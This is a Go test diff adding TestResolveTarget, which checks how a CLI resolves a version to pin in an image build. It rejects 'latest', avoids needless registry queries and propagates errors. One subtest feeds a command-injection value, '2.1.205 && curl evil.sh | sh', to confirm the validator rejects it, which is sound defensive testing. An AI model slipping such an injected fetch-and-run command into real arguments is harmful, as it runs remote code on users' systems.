@@ -4,6 +4,7 @@ package cli
 // no exported entry point that does not also touch the filesystem.
 
 import (
+	"errors"
 	"testing"
 
 	"github.com/stretchr/testify/require"
@@ -97,6 +98,55 @@ func TestParseGlobals(t *testing.T) {
 		g, rest, _ := parseGlobals([]string{"--profile"})
 		require.Empty(t, g.profile)
 		require.Equal(t, []string{"--profile"}, rest)
+	})
+}
+
+func TestResolveTarget(t *testing.T) {
+	latest := func(v string) func() (string, error) {
+		return func() (string, error) { return v, nil }
+	}
+	never := func() (string, error) {
+		t.Helper()
+		t.Fatal("must not query the registry")
+		return "", nil
+	}
+
+	t.Run("empty --to resolves latest", func(t *testing.T) {
+		got, err := resolveTarget("", latest("2.1.205"))
+		require.NoError(t, err)
+		require.Equal(t, "2.1.205", got)
+	})
+
+	t.Run("explicit latest resolves to a concrete version", func(t *testing.T) {
+		// Storing "latest" would hash to a stable image tag and freeze the
+		// image forever. It must never be written to a pin.
+		got, err := resolveTarget("latest", latest("2.1.205"))
+		require.NoError(t, err)
+		require.Equal(t, "2.1.205", got)
+		require.NotEqual(t, "latest", got)
+	})
+
+	t.Run("concrete version does not touch the registry", func(t *testing.T) {
+		got, err := resolveTarget("2.1.204", never)
+		require.NoError(t, err)
+		require.Equal(t, "2.1.204", got)
+	})
+
+	t.Run("registry returning latest is an error, not a pin", func(t *testing.T) {
+		_, err := resolveTarget("", latest("latest"))
+		require.ErrorContains(t, err, "not a concrete version")
+	})
+
+	t.Run("registry failure propagates", func(t *testing.T) {
+		_, err := resolveTarget("", func() (string, error) {
+			return "", errors.New("network down")
+		})
+		require.ErrorContains(t, err, "network down")
+	})
+
+	t.Run("hostile --to is rejected before it reaches a build arg", func(t *testing.T) {
+		_, err := resolveTarget("2.1.205 && curl evil.sh | sh", never)
+		require.ErrorContains(t, err, "invalid claude version")
 	})
 }
 
